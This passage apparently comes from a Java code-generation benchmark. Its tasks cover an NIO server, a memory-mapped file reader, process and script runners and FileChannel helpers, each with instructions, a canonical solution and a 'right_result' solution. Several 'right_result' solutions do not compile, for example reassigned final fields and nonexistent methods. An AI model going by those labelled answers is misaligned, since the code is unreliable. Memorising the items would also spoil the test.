(keyIterator.hasNext()) {\n                    SelectionKey key = keyIterator.next();\n                    if (key.isAcceptable()) {\n                        handleAccept(key, selector);\n                    } else if (key.isReadable()) {\n                        handleRead(key, selector);\n                    } else if (key.isWritable()) {\n                        handleWrite(key, selector);\n                    }\n                    keyIterator.remove();\n                }\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel clientChannel = ((ServerSocketChannel) key.channel()).accept();\n        clientChannel.configureBlocking(false);\n        clientChannel.register(selector, SelectionKey.OP_WRITE);\n    }\n\n    private void handleRead(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n        clientChannel.read(byteBuffer);\n        byteBuffer.flip();\n        System.out.println(Charset.defaultCharset().newDecoder().decode(byteBuffer).toString());\n        key.interestOps(SelectionKey.OP_WRITE);\n        selector.wakeup();\n    }\n\n    private void handleWrite(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n        String data = executeResponse().substring(0, 100);\n        byteBuffer.put(data.getBytes());\n        clientChannel.write(byteBuffer);\n        key.interestOps(SelectionKey.OP_READ);\n        selector.wakeup();\n    }\n\n    private String executeResponse() throws IOException {\n        String data = \"\";\n        HttpGet get = new HttpGet(\"http://www.baidu.com\");\n        HttpResponse response = client.execute(get);\n        if (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {\n            data = EntityUtils.toString(response.getEntity(), Charsets.UTF_8);\n        }\n        return data;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 21,
    "right_result": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.nio.charset.Charset;\nimport java.util.Iterator;\nimport org.apache.http.HttpEntity;\nimport org.apache.http.client.methods.CloseableHttpResponse;\nimport org.apache.http.client.methods.HttpGet;\nimport org.apache.http.impl.client.CloseableHttpClient;\nimport org.apache.http.impl.client.HttpClients;\nimport org.apache.http.util.EntityUtils;\n\npublic class NioHttpServer {\n    private final Charset charset = Charset.forName(\"UTF-8\");\n    private final CloseableHttpClient httpClient;\n    private ServerSocketChannel serverSocketChannel;\n    private Selector selector;\n\n    public NioHttpServer() {\n        this.httpClient = HttpClients.createDefault();\n    }\n\n    public void startServer(int port) throws IOException {\n        serverSocketChannel = ServerSocketChannel.open();\n        serverSocketChannel.configureBlocking(false);\n        serverSocketChannel.bind(new InetSocketAddress(port));\n        selector = Selector.open();\n        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n        new Thread(this::run).start();\n    }\n\n    private void handleAccept(SelectionKey key, Selector selector) throws IOException {\n        ServerSocketChannel serverChannel = (ServerSocketChannel) key.channel();\n        SocketChannel clientChannel = serverChannel.accept();\n        if (clientChannel != null) {\n            clientChannel.configureBlocking(false);\n            clientChannel.register(selector, SelectionKey.OP_READ);\n        }\n    }\n\n    private void handleRead(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        int bytesRead = clientChannel.read(buffer);\n        if (bytesRead == -1) {\n            clientChannel.close();\n            return;\n        }\n        buffer.flip();\n        String request = charset.decode(buffer).toString();\n        System.out.println(\"Received request: \" + request);\n        String baiduResponse = executeResponse();\n        ByteBuffer responseBuffer = charset.encode(baiduResponse);\n        clientChannel.register(selector, SelectionKey.OP_WRITE, responseBuffer);\n    }\n\n    private void handleWrite(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer buffer = (ByteBuffer) key.attachment();\n        int bytesWritten = clientChannel.write(buffer);\n        if (bytesWritten > 0) {\n            buffer.clear();\n            if (buffer.position() > 0) {\n                clientChannel.register(selector, SelectionKey.OP_WRITE, buffer);\n            } else {\n                clientChannel.close();\n            }\n        }\n    }\n\n    private String executeResponse() throws IOException {\n        try (CloseableHttpClient httpclient = HttpClients.createDefault()) {\n            HttpGet httpGet = new HttpGet(\"http://www.baidu.com\");\n            CloseableHttpResponse response = httpclient.execute(httpGet);\n            try {\n                HttpEntity entity = response.getEntity();\n                if (entity != null) {\n                    return EntityUtils.toString(entity);\n                }\n            } finally {\n                response.close();\n            }\n        }\n        return \"\";\n    }\n\n    private void run() {\n        while (true) {\n            try {\n                int readyKeys = selector.select();\n                if (readyKeys > 0) {\n                    Iterator<SelectionKey> keyIterator = selector.selectedKeys().iterator();\n                    while (keyIterator.hasNext()) {\n                        SelectionKey key = keyIterator.next();\n                        selector.selectedKeys().remove(key);\n                        if (key.isAcceptable()) {\n                            handleAccept(key, selector);\n                        } else if (key.isReadable()) {\n                            handleRead(key, selector);\n                        } else if (key.isWritable()) {\n                            handleWrite(key, selector);\n                        }\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 27,
    "Instruction": "Task Description: Implement a class for memory-mapped file reading with random access capabilities using Java NIO's FileChannel and MappedByteBuffer.\n\nClass Description: RandomAccessReadMemoryMappedFile is a class that provides random access reading functionality for files using memory-mapped I/O. It maps a file into memory for efficient reading operations and implements common random access operations like seek, read, and position tracking.\n\nAttributes:\n- mappedByteBuffer: ByteBuffer - The memory-mapped buffer containing the file contents\n- size: long - The size of the file in bytes\n- fileChannel: FileChannel - The file channel used for memory mapping\n- unmapper: Consumer<? super ByteBuffer> - A consumer for properly unmapping the buffer when closing\n\nMethods:\n- Constructor(filename: String) -> void - Creates an instance by opening the specified file\n- Constructor(file: File) -> void - Creates an instance using the specified File object\n- Constructor(path: Path) -> void - Creates an instance using the specified Path object\n- close() -> void - Closes the file channel and unmaps the buffer\n- seek(position: long) -> void - Sets the reading position in the file\n- getPosition() -> long - Returns the current reading position\n- read() -> int - Reads a single byte from the current position\n- read(b: byte[], offset: int, length: int) -> int - Reads bytes into an array\n- length() -> long - Returns the file size\n- isClosed() -> boolean - Checks if the reader is closed\n- isEOF() -> boolean - Checks if the current position is at end of file\n- checkClosed() -> void - Internal method to verify the reader isn't closed (throws IOException if closed)",
    "Canonical_solution": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.EnumSet;\nimport java.util.Optional;\nimport java.util.function.Consumer;\n\npublic class RandomAccessReadMemoryMappedFile implements RandomAccessRead\n{\n    private ByteBuffer mappedByteBuffer;\n    private final long size;\n    private final FileChannel fileChannel;\n    private final Consumer<? super ByteBuffer> unmapper;\n\n    public RandomAccessReadMemoryMappedFile(String filename) throws IOException\n    {\n        this(new File(filename));\n    }\n\n    public RandomAccessReadMemoryMappedFile(File file) throws IOException\n    {\n        this(file.toPath());\n    }\n\n    public RandomAccessReadMemoryMappedFile(Path path) throws IOException\n    {\n        fileChannel = FileChannel.open(path, EnumSet.of(StandardOpenOption.READ));\n        size = fileChannel.size();\n        if (size > Integer.MAX_VALUE)\n        {\n            throw new IOException(getClass().getName() + \" doesn't yet support files bigger than \"\n                    + Integer.MAX_VALUE);\n        }\n        mappedByteBuffer = fileChannel.map(FileChannel.MapMode.READ_ONLY, 0, size);\n        unmapper = IOUtils::unmap;\n    }\n\n    @Override\n    public void close() throws IOException\n    {\n        if (fileChannel != null)\n        {\n            fileChannel.close();\n        }\n        if (mappedByteBuffer != null)\n        {\n            Optional.ofNullable(unmapper).ifPresent(u -> u.accept(mappedByteBuffer));\n            mappedByteBuffer = null;\n        }\n    }\n\n    @Override\n    public void seek(long position) throws IOException\n    {\n        checkClosed();\n        if (position < 0)\n        {\n            throw new IOException(\"Invalid position \"+position);\n        }\n        mappedByteBuffer.position((int) Math.min(position, size));\n    }\n\n    @Override\n    public long getPosition() throws IOException\n    {\n       checkClosed();\n       return mappedByteBuffer.position();\n    }\n\n    @Override\n    public int read() throws IOException\n    {\n        if (isEOF())\n        {\n            return -1;\n        }\n        return mappedByteBuffer.get() & 0xff;\n    }\n\n    @Override\n    public int read(byte[] b, int offset, int length) throws IOException\n    {\n        if (isEOF())\n        {\n            return -1;\n        }\n        int remainingBytes = (int)size - mappedByteBuffer.position();\n        remainingBytes = Math.min(remainingBytes, length);\n        mappedByteBuffer.get(b, offset, remainingBytes);\n        return remainingBytes;\n    }\n\n    @Override\n    public long length() throws IOException\n    {\n        checkClosed();\n        return size;\n    }\n\n    private void checkClosed() throws IOException\n    {\n        if (isClosed())\n        {\n            throw new IOException(getClass().getSimpleName() + \" already closed\");\n        }\n    }\n\n    @Override\n    public boolean isClosed()\n    {\n        return mappedByteBuffer == null;\n    }\n\n    @Override\n    public boolean isEOF() throws IOException\n    {\n        checkClosed();\n        return mappedByteBuffer.position() >= size;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "import java.io.IOException;\nimport java.io.File;\nimport java.nio.MappedByteBuffer;\nimport java.nio.file.*;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.function.Consumer;\n\npublic class RandomAccessReadMemoryMappedFile {\n    private final MappedByteBuffer mappedByteBuffer;\n    private final long size;\n    private final FileChannel fileChannel;\n    private final Consumer<? super ByteBuffer> unmapper;\n    private final AtomicBoolean closed = new AtomicBoolean(false);\n\n    public RandomAccessReadMemoryMappedFile(String filename) throws IOException {\n        checkClosed();\n        Path path = Paths.get(filename);\n        fileChannel = FileChannel.open(path, StandardOpenOption.READ);\n        size = fileChannel.size();\n        mappedByteBuffer = fileChannel.map(FileChannel.MapMode.READ_ONLY, 0, size);\n        unmapper = buffer -> buffer.unmap();\n        closed.set(false);\n    }\n\n    public RandomAccessReadMemoryMappedFile(File file) throws IOException {\n        checkClosed();\n        fileChannel = FileChannel.open(file.toPath(), StandardOpenOption.READ);\n        size = fileChannel.size();\n        mappedByteBuffer = fileChannel.map(FileChannel.MapMode.READ_ONLY, 0, size);\n        unmapper = buffer -> buffer.unmap();\n        closed.set(false);\n    }\n\n    public RandomAccessReadMemoryMappedFile(Path path) throws IOException {\n        checkClosed();\n        fileChannel = FileChannel.open(path, StandardOpenOption.READ);\n        size = fileChannel.size();\n        mappedByteBuffer = fileChannel.map(FileChannel.MapMode.READ_ONLY, 0, size);\n        unmapper = buffer -> buffer.unmap();\n        closed.set(false);\n    }\n\n    public void close() throws IOException {\n        checkClosed();\n        closed.set(true);\n        fileChannel.close();\n        unmapper.accept(mappedByteBuffer);\n    }\n\n    public void seek(long position) {\n        checkClosed();\n        if (position < 0 || position > size) {\n            throw new IllegalArgumentException(\"Position out of bounds\");\n        }\n        mappedByteBuffer.position(position);\n    }\n\n    public long getPosition() {\n        checkClosed();\n        return mappedByteBuffer.position();\n    }\n\n    public int read() {\n        checkClosed();\n        if (mappedByteBuffer.position() >= size) {\n            return -1;\n        }\n        int b = mappedByteBuffer.get();\n        return b;\n    }\n\n    public int read(byte[] b, int offset, int length) {\n        checkClosed();\n        if (offset < 0 || offset + length > b.length) {\n            throw new IllegalArgumentException(\"Bounds error\");\n        }\n        int bytesRead = mappedByteBuffer.get(b, offset, length);\n        return bytesRead;\n    }\n\n    public long length() {\n        checkClosed();\n        return size;\n    }\n\n    public boolean isClosed() {\n        return closed.get();\n    }\n\n    public boolean isEOF() {\n        checkClosed();\n        return mappedByteBuffer.position() >= size;\n    }\n\n    private void checkClosed() {\n        if (closed.get()) {\n            throw new IOException(\"Reader is closed\");\n        }\n    }\n}"
  },
  {
    "Task_id": 275,
    "Instruction": "Task Description: Create a Java class that manages external processes, handling their input/output streams and providing control over process execution, including starting, stopping, and monitoring.\n\nClass Description: The DaemonHandler class is designed to manage external processes executed via ProcessBuilder. It provides functionality to start processes with either delimited or undelimited output handling, stop processes (either gracefully or forcibly), and retrieve process exit codes. The class maintains separate threads for handling standard output and error streams, with output being captured and placed into a shared blocking deque.\n\nAttributes:\n- processBuilder: ProcessBuilder - Configures and starts external processes\n- process: Process - Represents the currently running external process\n- outThread: Thread - Thread handling standard output stream\n- errThread: Thread - Thread handling error output stream\n- errProxy: OutputProxy - Proxy for handling error stream output\n- outProxy: OutputProxy - Proxy for handling standard output stream\n- deque: BlockingDeque<Event> - Shared queue for process output events\n- stdOut: boolean - Flag indicating whether to capture standard output\n\nMethods:\n- DaemonHandler(BlockingDeque<Event>, String...) -> void - Constructor that initializes the process handler with output queue and command\n- setStdOutListener(boolean) -> void - Sets whether to capture standard output\n- startDelimited() -> Process - Starts process with delimited output handling (using default delimiter)\n- startDelimited(byte) -> Process - Starts process with custom delimiter for output handling\n- startUndelimited() -> Process - Starts process with undelimited output handling (default buffer size)\n- startUndelimited(int) -> Process - Starts process with undelimited output handling (custom buffer size)\n- stop(boolean) -> void - Stops the managed process (optionally forcibly)\n- getExitCode() -> int - Retrieves the exit code of the process (or PROCESS_STOPPED if not running)",
    "Canonical_solution": "import com.linbit.extproc.OutputProxy.Event;\nimport java.io.IOException;\nimport java.lang.ProcessBuilder.Redirect;\nimport java.util.concurrent.BlockingDeque;\nimport java.util.concurrent.TimeUnit;\n\npublic class DaemonHandler\n{\n    public static final int PROCESS_STOPPED = Integer.MAX_VALUE;\n    private static final byte DELIMITER = '\\n';\n\n    private final ProcessBuilder processBuilder;\n    private Process process;\n\n    private Thread outThread;\n    private Thread errThread;\n    private OutputProxy errProxy;\n    private OutputProxy outProxy;\n\n    private final BlockingDeque<Event> deque;\n    private boolean stdOut;\n\n    public DaemonHandler(final BlockingDeque<Event> dequeRef, final String... command)\n    {\n        deque = dequeRef;\n        processBuilder = new ProcessBuilder(command);\n        processBuilder.redirectError(Redirect.PIPE);\n        stdOut = true;\n    }\n\n    public void setStdOutListener(boolean stdOutRef)\n    {\n        stdOut = stdOutRef;\n    }\n\n    public Process startDelimited() throws IOException\n    {\n        return startDelimited(DELIMITER);\n    }\n\n    public Process startDelimited(byte delimiterRef) throws IOException\n    {\n        stop(true);\n\n        process = processBuilder.start();\n        errProxy = new OutputProxyDelimited(process.getErrorStream(), deque, delimiterRef, false);\n        errThread = new Thread(errProxy);\n        if (stdOut)\n        {\n            outProxy = new OutputProxyDelimited(process.getInputStream(), deque, delimiterRef, true);\n            outThread = new Thread(outProxy);\n            outThread.start();\n        }\n        errThread.start();\n        return process;\n    }\n\n    public Process startUndelimited() throws IOException\n    {\n        return startUndelimited(OutputProxy.DFLT_BUFFER_SIZE);\n    }\n\n    public Process startUndelimited(int bufferSize) throws IOException\n    {\n        stop(true);\n\n        process = processBuilder.start();\n        errProxy = new OutputProxy(process.getErrorStream(), deque, false, bufferSize);\n        errThread = new Thread(errProxy);\n        if (stdOut)\n        {\n            outProxy = new OutputProxy(process.getInputStream(), deque, true, bufferSize);\n            outThread = new Thread(outProxy);\n            outThread.start();\n        }\n        errThread.start();\n        return process;\n    }\n\n    public void stop(boolean force)\n    {\n        if (process != null)\n        {\n            if (outProxy != null)\n            {\n                outProxy.expectShutdown();\n            }\n            errProxy.expectShutdown();\n            if (force)\n            {\n                process.destroyForcibly();\n            }\n            else\n            {\n                process.destroy();\n            }\n            if (outThread != null)\n            {\n                outThread.interrupt();\n            }\n            errThread.interrupt();\n            process = null;\n        }\n    }\n\n    public int getExitCode()\n    {\n        int exitValue;\n        Process proc = process;\n        if (proc != null)\n        {\n            if (proc.isAlive())\n            {\n                try\n                {\n                    proc.waitFor(500, TimeUnit.MILLISECONDS);\n                }\n                catch (InterruptedException ignored)\n                {\n                }\n                if (proc.isAlive())\n                {\n                    throw new ImplementationError(\"Process is still running\");\n                }\n            }\n            exitValue = proc.exitValue();\n        }\n        else\n        {\n            exitValue = PROCESS_STOPPED;\n        }\n        return exitValue;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "right_result": "import java.io.*;\nimport java.util.concurrent.BlockingDeque;\nimport java.util.concurrent.LinkedBlockingDeque;\n\npublic class DaemonHandler {\n    private final ProcessBuilder processBuilder;\n    private final Process process;\n    private final Thread outThread;\n    private final Thread errThread;\n    private final OutputProxy outProxy;\n    private final OutputProxy errProxy;\n    private final BlockingDeque<Event> deque;\n    private boolean stdOut;\n\n    public DaemonHandler(BlockingDeque<Event> deque, String... commands) {\n        this.deque = deque;\n        this.processBuilder = new ProcessBuilder(commands);\n        this.stdOut = true;\n        this.outProxy = new OutputProxy(deque);\n        this.errProxy = new OutputProxy(deque);\n        this.outThread = new Thread(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    Event event = new Event(EventType.STDOUT, line);\n                    outProxy.addEvent(event);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n        this.errThread = new Thread(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    Event event = new Event(EventType.STDERR, line);\n                    errProxy.addEvent(event);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n    }\n\n    public void setStdOutListener(boolean stdOut) {\n        this.stdOut = stdOut;\n    }\n\n    public Process startDelimited() {\n        processBuilder.redirectErrorStream(false);\n        process = processBuilder.start();\n        outThread.start();\n        errThread.start();\n        return process;\n    }\n\n    public Process startDelimited(byte delimiter) {\n        processBuilder.redirectErrorStream(false);\n        process = processBuilder.start();\n        outThread = new Thread(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n                StringBuilder buffer = new StringBuilder();\n                char c;\n                while ((c = reader.read()) != -1) {\n                    buffer.append(c);\n                    if (c == delimiter) {\n                        Event event = new Event(EventType.STDOUT, buffer.toString());\n                        outProxy.addEvent(event);\n                        buffer.setLength(0);\n                    }\n                }\n                if (buffer.length() > 0) {\n                    Event event = new Event(EventType.STDOUT, buffer.toString());\n                    outProxy.addEvent(event);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n        errThread = new Thread(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {\n                StringBuilder buffer = new StringBuilder();\n                char c;\n                while ((c = reader.read()) != -1) {\n                    buffer.append(c);\n                    if (c == delimiter) {\n                        Event event = new Event(EventType.STDERR, buffer.toString());\n                        errProxy.addEvent(event);\n                        buffer.setLength(0);\n                    }\n                }\n                if (buffer.length() > 0) {\n                    Event event = new Event(EventType.STDERR, buffer.toString());\n                    errProxy.addEvent(event);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n        outThread.start();\n        errThread.start();\n        return process;\n    }\n\n    public Process startUndelimited() {\n        processBuilder.redirectErrorStream(false);\n        process = processBuilder.start();\n        outThread.start();\n        errThread.start();\n        return process;\n    }\n\n    public Process startUndelimited(int bufferSize) {\n        processBuilder.redirectErrorStream(false);\n        process = processBuilder.start();\n        outThread = new Thread(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()), bufferSize)) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    Event event = new Event(EventType.STDOUT, line);\n                    outProxy.addEvent(event);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n        errThread = new Thread(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()), bufferSize)) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    Event event = new Event(EventType.STDERR, line);\n                    errProxy.addEvent(event);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n        outThread.start();\n        errThread.start();\n        return process;\n    }\n\n    public void stop(boolean force) {\n        if (force) {\n            process.destroyForcibly();\n        } else {\n            process.destroy();\n        }\n    }\n\n    public int getExitCode() {\n        if (process.isAlive()) {\n            return PROCESS_STOPPED;\n        }\n        try {\n            return process.waitFor();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            return -1;\n        }\n    }\n\n    private static class OutputProxy {\n        private final BlockingDeque<Event> deque;\n\n        public OutputProxy(BlockingDeque<Event> deque) {\n            this.deque = deque;\n        }\n\n        public void addEvent(Event event) {\n            try {\n                deque.put(event);\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n\n    private static class Event {\n        private final EventType type;\n        private final String data;\n\n        public Event(EventType type, String data) {\n            this.type = type;\n            this.data = data;\n        }\n\n        public EventType getType() {\n            return type;\n        }\n\n        public String getData() {\n            return data;\n        }\n    }\n\n    private static class EventType {\n        public static final EventType STDOUT = new EventType();\n        public static final EventType STDERR = new EventType();\n\n        private EventType() {}\n    }\n\n    private static final int PROCESS_STOPPED = -1;\n}"
  },
  {
    "Task_id": 276,
    "Instruction": "Task Description: Create a Java abstract class that provides functionality for executing external scripts in a cross-platform manner, handling both input and error streams concurrently, and logging the results.\n\nClass Description: AbstractScriptProcessor is an abstract base class designed to execute external scripts (shell scripts for Unix-like systems or batch files for Windows) while properly handling process streams and logging. It uses ProcessBuilder for process creation and ForkJoinPool for concurrent stream handling.\n\nAttributes:\n- POOL: [ForkJoinPool] - A shared thread pool for concurrent stream processing\n- SH_SHELL: [String] - Constant for Unix shell path (/bin/sh)\n- CMD_SHELL: [String] - Constant for Windows command processor (cmd.exe)\n\nMethods:\n- executeScript: [TaskContext context, String scriptPath] -> [ProcessResult] - Executes the specified script file, handles platform compatibility checks, manages process streams, and returns execution results\n- copyStream: [InputStream is, StringBuilder sb, OmsLogger omsLogger, Charset charset] -> [void] - Helper method to copy stream contents to a StringBuilder while logging\n- getRunCommand: [] -> [String] - Abstract method to be implemented by subclasses to return the appropriate shell command\n- getCharset: [] -> [Charset] - Returns the charset to use for stream processing (defaults to UTF-8)",
    "Canonical_solution": "import tech.powerjob.worker.core.processor.ProcessResult;\nimport tech.powerjob.worker.core.processor.TaskContext;\nimport tech.powerjob.worker.log.OmsLogger;\nimport org.apache.commons.lang3.StringUtils;\nimport org.apache.commons.lang3.SystemUtils;\nimport java.io.*;\nimport java.nio.charset.Charset;\nimport java.nio.file.Files;\nimport java.util.concurrent.ForkJoinPool;\nimport java.util.concurrent.ForkJoinTask;\n\npublic abstract class AbstractScriptProcessor {\n\n    private static final ForkJoinPool POOL = new ForkJoinPool(4 * Runtime.getRuntime().availableProcessors());\n    protected static final String SH_SHELL = \"/bin/sh\";\n    protected static final String CMD_SHELL = \"cmd.exe\";\n\n    protected ProcessResult executeScript(TaskContext context, String scriptPath) throws Exception {\n        OmsLogger omsLogger = context.getOmsLogger();\n        \n        if (SystemUtils.IS_OS_WINDOWS && StringUtils.equals(getRunCommand(), SH_SHELL)) {\n            String message = String.format(\"[SYSTEM] Current OS is %s where shell scripts cannot run.\", SystemUtils.OS_NAME);\n            omsLogger.warn(message);\n            return new ProcessResult(false, message);\n        }\n\n        ProcessBuilder pb = StringUtils.equals(getRunCommand(), CMD_SHELL) ?\n                new ProcessBuilder(getRunCommand(), \"/c\", scriptPath)\n                : new ProcessBuilder(getRunCommand(), scriptPath);\n        Process process = pb.start();\n\n        StringBuilder inputBuilder = new StringBuilder();\n        StringBuilder errorBuilder = new StringBuilder();\n\n        boolean success = true;\n        String result;\n\n        final Charset charset = getCharset();\n        try {\n            InputStream is = process.getInputStream();\n            InputStream es = process.getErrorStream();\n\n            ForkJoinTask<?> inputSubmit = POOL.submit(() -> copyStream(is, inputBuilder, omsLogger, charset));\n            ForkJoinTask<?> errorSubmit = POOL.submit(() -> copyStream(es, errorBuilder, omsLogger, charset));\n\n            success = process.waitFor() == 0;\n\n            inputSubmit.get();\n            errorSubmit.get();\n\n        } catch (InterruptedException ie) {\n            omsLogger.info(\"[SYSTEM] ScriptProcessor has been interrupted\");\n        } finally {\n            result = String.format(\"[INPUT]: %s;[ERROR]: %s\", inputBuilder, errorBuilder);\n        }\n        return new ProcessResult(success, result);\n    }\n\n    private void copyStream(InputStream is, StringBuilder sb, OmsLogger omsLogger, Charset charset) {\n        String line;\n        try (BufferedReader br = new BufferedReader(new InputStreamReader(is, charset))) {\n            while ((line = br.readLine()) != null) {\n                sb.append(line).append(System.lineSeparator());\n                omsLogger.info(line);\n            }\n        } catch (Exception e) {\n            omsLogger.warn(\"[SYSTEM] copyStream failed.\", e);\n            sb.append(\"Exception: \").append(e);\n        } finally {\n            try {\n                is.close();\n            } catch (IOException e) {\n                omsLogger.warn(\"[SYSTEM] close stream failed.\", e);\n            }\n        }\n    }\n\n    protected abstract String getRunCommand();\n\n    protected Charset getCharset() {\n        return StandardCharsets.UTF_8;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.InputStream;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.IOException;\nimport java.nio.charset.Charset;\nimport java.nio.charset.StandardCharsets;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.concurrent.ForkJoinPool;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.ExecutionException;\n\npublic abstract class AbstractScriptProcessor {\n    private static final ForkJoinPool POOL = ForkJoinPool.commonPool();\n    private static final String SH_SHELL = \"/bin/sh\";\n    private static final String CMD_SHELL = \"cmd.exe\";\n\n    protected abstract String getRunCommand();\n\n    protected Charset getCharset() {\n        return StandardCharsets.UTF_8;\n    }\n\n    public ProcessResult executeScript(TaskContext context, String scriptPath) {\n        boolean isWindows = System.getProperty(\"os.name\").toLowerCase().contains(\"windows\");\n        String command = getRunCommand();\n        List<String> commands = new ArrayList<>();\n        commands.add(command);\n        commands.add(scriptPath);\n        ProcessBuilder pb = new ProcessBuilder(commands);\n        pb.redirectErrorStream(false);\n\n        try {\n            Process process = pb.start();\n\n            StringBuilder stdoutSB = new StringBuilder();\n            StringBuilder stderrSB = new StringBuilder();\n\n            POOL.submit(() -> copyStream(process.getInputStream(), stdoutSB, context.getLogger(), getCharset()));\n            POOL.submit(() -> copyStream(process.getErrorStream(), stderrSB, context.getLogger(), getCharset()));\n\n            int exitCode = process.waitFor();\n\n            String stdout = stdoutSB.toString();\n            String stderr = stderrSB.toString();\n\n            return new ProcessResult(exitCode, stdout, stderr);\n        } catch (Exception e) {\n            return new ProcessResult(-1, \"Error executing script: \" + e.getMessage(), \"\");\n        }\n    }\n\n    private void copyStream(InputStream is, StringBuilder sb, OmsLogger logger, Charset charset) {\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(is, charset))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                sb.append(line);\n                logger.log(line);\n            }\n        } catch (IOException e) {\n            logger.log(\"Error reading stream: \" + e.getMessage());\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 28,
    "Instruction": "Task Description: Create utility functions for working with FileChannel in Java NIO to provide OutputStream functionality with optional force-write capability at close.\n\nFunction Description: The provided code consists of three utility functions that work together to create an OutputStream wrapper around a FileChannel, with control over whether changes are forcibly written to disk when closing the stream.\n\nInput:\n1. For newOutputStream:\n   - channel: FileChannel - The FileChannel to wrap with OutputStream functionality\n   - forceAtClose: boolean - Whether to force write changes to disk when closing\n\n2. For newOutputStreamForceAtClose:\n   - p: Path - The file path to open\n   - options: OpenOption... - Variable arguments of file open options\n\n3. For newFileChannel:\n   - p: Path - The file path to open\n   - options: OpenOption... - Variable arguments of file open options\n\nOutput:\n1. For newOutputStream: OutputStream - A new OutputStream instance that writes to the provided FileChannel\n2. For newOutputStreamForceAtClose: OutputStream - A new OutputStream instance that forces writes to disk when closed\n3. For newFileChannel: FileChannel - A new FileChannel instance for the specified path with given options",
    "Canonical_solution": "import java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.io.OutputStream;\nimport java.io.IOException;\n\nstatic OutputStream newOutputStream(FileChannel channel, boolean forceAtClose) {\n    final byte[] single = {0};\n    return new OutputStream() {\n        @Override\n        public void write(int b) throws IOException {\n            single[0] = (byte) b;\n            write(single);\n        }\n\n        @Override\n        public void write(byte[] b, int off, int len) throws IOException {\n            for(; len > 0; ) {\n                final int written = channel.write(ByteBuffer.wrap(b, off, len));\n                off += written;\n                len -= written;\n            }\n        }\n\n        @Override\n        public void close() throws IOException {\n            try (FileChannel c = channel) {\n                if (forceAtClose) {\n                    c.force(true);\n                }\n            }\n        }\n    };\n}\n\nstatic OutputStream newOutputStreamForceAtClose(Path p, OpenOption... options) throws IOException {\n    return newOutputStream(newFileChannel(p, options), true);\n}\n\nstatic FileChannel newFileChannel(Path p, OpenOption... options) throws IOException {\n    return LogUtils.supplyAndLog(LOG,\n        () -> FileChannel.open(p, options),\n        () -> \"FileChannel.open \" + p + \" with options \" + Arrays.asList(options));\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 9,
